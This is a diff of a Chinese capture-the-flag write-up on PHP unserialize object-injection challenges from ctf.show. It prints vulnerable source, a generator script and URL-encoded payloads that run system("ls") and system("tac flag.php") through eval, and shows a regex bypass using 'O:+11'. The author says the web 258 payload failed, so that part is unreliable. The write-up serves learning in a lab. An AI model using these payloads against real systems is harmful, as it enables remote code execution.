@@ -78,7 +78,7 @@ if(isset($username) && isset($password)){
 http://dd78310d-6f85-49a1-a642-ac58a05a72d9.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -141,7 +141,7 @@ if(isset($username) && isset($password)){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -171,7 +171,7 @@ echo serialize($a);
 
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到的结果为
 
@@ -189,7 +189,7 @@ O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%2
 cookie的内容需要url编码
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后我们的GET里面的参数还是
 
@@ -197,11 +197,11 @@ cookie的内容需要url编码
 http://e3d28ae1-883e-408a-a621-5799c1ada8fd.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
 ```
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到flag
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -265,7 +265,7 @@ if(isset($username) && isset($password)){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -297,7 +297,7 @@ echo urlencode(serialize($a));
 O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22456%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
 ```
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 传入GET的结果是
 
@@ -376,31 +376,215 @@ if(isset($username) && isset($password)){
 
 ### ①代码解释
 
-这个代码比较复杂了家人们，
+这个代码比较复杂了家人们，首先还是GET方式得到两个参数$username $password,然后反序列化cookie里面的user，再创建这个之前，我们需要执行\_\_construct()，然后再讲login传入username和password，然后然后再执行\_\_destruct(),然后再执行getInfo（），这个时候就要看class是等于什么了。
+
+### ②思路解释
+
+如果我们想要他执行backDoor里面的getinfo，我们就要让class等于backDoor，然后我们就有机会控制eval（）函数执行的代码片段。
+
+所以这个时候我们可以用php代码来生成我们需要的user。
+
+除了基本的，我们就是让class等于backDoor，让code等于我们要执行的代码差不多是system("ls");
+
+```php
+<?php
+
+class ctfShowUser{
+    private $username='xxxxxx';
+    private $password='xxxxxx';
+    private $isVip=false;
+    private $class = 'backDoor';
+
+    public function __construct(){
+        $this->class=new backDoor();
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function __destruct(){
+        $this->class->getInfo();
+    }
+
+}
+
+class info{
+    private $user='xxxxxx';
+    public function getInfo(){
+        return $this->user;
+    }
+}
+
+class backDoor{
+    private $code='system("ls");';
+    public function getInfo(){
+        eval($this->code);
+    }
+}
+
+$a=new ctfShowUser();
+echo urlencode(serialize($a));
+
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+```
+O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%22ls%22%29%3B%22%3B%7D%7D
+```
+
+然后我们将这个写入到cookie里面，
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+然后我们再写入GET参数
+
+```url
+http://4e682701-7827-469b-b19a-e1fa65731ba8.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+这里我们首先写入的是ls命令，我们看到flag.php文件，所以我们查看flag.php
+
+我们将他修改为
+
+```
+O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+最后得到flag。
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+## <mark style="color:blue;background-color:purple;">（5）web 258</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 21:38:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+    public $class = 'info';
+
+    public function __construct(){
+        $this->class=new info();
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function __destruct(){
+        $this->class->getInfo();
+    }
+
+}
+
+class info{
+    public $user='xxxxxx';
+    public function getInfo(){
+        return $this->user;
+    }
+}
+
+class backDoor{
+    public $code;
+    public function getInfo(){
+        eval($this->code);
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) && isset($password)){
+    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
+        $user = unserialize($_COOKIE['user']);
+    }
+    $user->login($username,$password);
+}
+
+```
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+### ①代码解释
+
+就是加了正则表达式，其他都差异。我们这里就直接解释这个正则表达式了。这个正则表达式匹配的就是字母:数字，这种，举个例子就是O:124,C:123,o:123,c:123.
+
+### ②思路解释
+
+这个我的确是不知道，但是看了别人的wp，大概是，就是在数字前面加一个+，是表示正数吗，我不太清楚，记住就行了吧。
+
+所以其实得到的是
+
+```
+O:11:"ctfShowUser":4:{s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:0;s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:23:"system("tac flag.php");";}}
+```
+
+所以最后是
+
+```
+O:+11:"ctfShowUser":4:{s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:0;s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:23:"system("tac flag.php");";}}
+```
+
+url encode之后就是
+
+```
+O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22ctfShowUserusername%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22ctfShowUserpassword%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22ctfShowUserisVip%22%3Bb%3A0%3Bs%3A18%3A%22ctfShowUserclass%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22backDoorcode%22%3Bs%3A23%3A%22system(%22tac%20flag.php%22)%3B%22%3B%7D%7D
+```
+
+不知道为什么我这个出不来，我不想死在这，但是这个方法是这样没有错误的的，如果有那也不是我的问题了。
 
 
 
+## <mark style="color:blue;background-color:purple;">（6）WEB 260</mark>
 
+```php
+ <?php
 
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
 
+if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
+    echo $flag;
+}
 
+```
 
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
+### ①代码解释
 
+只要匹配有ctfshow......就行了。
 
+### ②思路解释
 
+那我们就直接写一个数组里面包含ctfshow......就行了。
 
+```
+http://7b449c38-ff6e-4537-8613-49e9378f741e.challenge.ctf.show/?ctfshow[]='ctfshow_i_love_36D'
+```
 
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-
-
-
-
+（7）
 
 
 
